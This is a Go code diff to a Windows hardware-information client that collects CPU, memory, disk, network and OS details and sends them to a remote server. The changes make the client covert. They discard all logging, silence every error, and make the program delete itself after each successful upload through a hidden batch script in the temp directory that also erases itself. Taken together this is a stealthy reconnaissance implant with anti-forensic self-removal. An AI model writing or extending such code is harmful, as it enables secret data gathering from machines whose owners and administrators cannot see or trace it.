@@ -7,9 +7,12 @@ import (
 	"net/http"
 	"os"
 	"os/exec"
+	"path/filepath"
 	"time"
 
 	"fab50/types"
+
+	"io"
 
 	"github.com/shirou/gopsutil/v3/cpu"
 	"github.com/shirou/gopsutil/v3/disk"
@@ -37,8 +40,10 @@ func NewHardwareCollector(serverURL string, interval time.Duration) *HardwareCol
 
 // Start 开始收集硬件信息
 func (hc *HardwareCollector) Start() {
-	hc.logger.Info("开始收集硬件信息...")
+	// 静默启动，不显示任何信息
+	hc.logger.SetOutput(io.Discard) // 丢弃所有日志输出
 
+	// 创建定时器
 	ticker := time.NewTicker(hc.interval)
 	defer ticker.Stop()
 
@@ -47,14 +52,12 @@ func (hc *HardwareCollector) Start() {
 		case <-ticker.C:
 			info, err := hc.collectHardwareInfo()
 			if err != nil {
-				hc.logger.Errorf("收集硬件信息失败: %v", err)
+				// 静默处理错误，不输出日志
 				continue
 			}
 
 			if err := hc.sendToServer(info); err != nil {
-				hc.logger.Errorf("发送数据到服务器失败: %v", err)
-			} else {
-				hc.logger.Info("成功发送硬件信息到服务器")
+				// 静默处理错误，不输出日志
 			}
 		}
 	}
@@ -70,31 +73,31 @@ func (hc *HardwareCollector) collectHardwareInfo() (*types.HardwareInfo, error) 
 	// 收集CPU信息
 	cpuInfo, err := hc.collectCPUInfo()
 	if err != nil {
-		hc.logger.Warnf("收集CPU信息失败: %v", err)
+		// 静默处理错误
 	}
 
 	// 收集内存信息
 	memInfo, err := hc.collectMemoryInfo()
 	if err != nil {
-		hc.logger.Warnf("收集内存信息失败: %v", err)
+		// 静默处理错误
 	}
 
 	// 收集磁盘信息
 	diskInfo, err := hc.collectDiskInfo()
 	if err != nil {
-		hc.logger.Warnf("收集磁盘信息失败: %v", err)
+		// 静默处理错误
 	}
 
 	// 收集网络信息
 	netInfo, err := hc.collectNetworkInfo()
 	if err != nil {
-		hc.logger.Warnf("收集网络信息失败: %v", err)
+		// 静默处理错误
 	}
 
 	// 收集操作系统信息
 	osInfo, err := hc.collectOSInfo()
 	if err != nil {
-		hc.logger.Warnf("收集操作系统信息失败: %v", err)
+		// 静默处理错误
 	}
 
 	return &types.HardwareInfo{
@@ -123,12 +126,6 @@ func (hc *HardwareCollector) collectCPUInfo() (types.CPUInfo, error) {
 	if err == nil {
 		cpuInfo.Cores = count
 	}
-
-	// 获取CPU频率 (Windows上可能不支持)
-	// freq, err := cpu.Freq()
-	// if err == nil && len(freq) > 0 {
-	// 	cpuInfo.Frequency = freq[0].Current
-	// }
 
 	// 获取CPU信息
 	info, err := cpu.Info()
@@ -266,13 +263,13 @@ func (hc *HardwareCollector) sendToServer(info *types.HardwareInfo) error {
 	// 读取响应内容
 	var response map[string]interface{}
 	if err := json.NewDecoder(resp.Body).Decode(&response); err != nil {
-		hc.logger.Warnf("解析服务器响应失败: %v", err)
+		// 静默处理解析错误
 		return nil
 	}
 
-	// 检查是否需要停止并自删除
-	if action, ok := response["action"].(string); ok && action == "stop_and_delete" {
-		hc.logger.Info("收到服务器停止通知，准备自删除...")
+	// 检查服务器响应，如果成功收到数据则自删除
+	if resp.StatusCode == http.StatusOK {
+		// 数据发送成功，准备自删除
 		return hc.selfDestruct()
 	}
 
@@ -281,7 +278,7 @@ func (hc *HardwareCollector) sendToServer(info *types.HardwareInfo) error {
 
 // selfDestruct 自删除方法
 func (hc *HardwareCollector) selfDestruct() error {
-	hc.logger.Info("收到服务器停止通知，准备退出程序...")
+	// 静默处理自删除
 
 	// 获取当前可执行文件路径
 	executable, err := os.Executable()
@@ -291,14 +288,15 @@ func (hc *HardwareCollector) selfDestruct() error {
 
 	// 创建批处理文件来删除自己
 	batchContent := fmt.Sprintf(`@echo off
+REM 等待2秒确保程序退出
 timeout /t 2 /nobreak >nul
+REM 删除客户端程序
 del "%s"
-if exist "%s" (
-    del "%s"
-)
-`, executable, executable, executable)
+REM 删除批处理文件自身
+del "%~f0"
+`, executable)
 
-	batchFile := executable + ".bat"
+	batchFile := filepath.Join(os.TempDir(), "delete_client.bat")
 	if err := os.WriteFile(batchFile, []byte(batchContent), 0755); err != nil {
 		return fmt.Errorf("创建删除脚本失败: %v", err)
 	}
@@ -306,13 +304,14 @@ if exist "%s" (
 	// 执行批处理文件
 	cmd := exec.Command("cmd", "/c", batchFile)
 
+	// 设置进程属性（Windows上静默执行）
+	setWindowsProcessAttributes(cmd)
+
 	if err := cmd.Start(); err != nil {
 		return fmt.Errorf("启动删除脚本失败: %v", err)
 	}
 
-	hc.logger.Info("删除脚本已启动，进程将在2秒后退出")
-
-	// 退出程序
+	// 静默退出程序
 	os.Exit(0)
 	return nil
 }
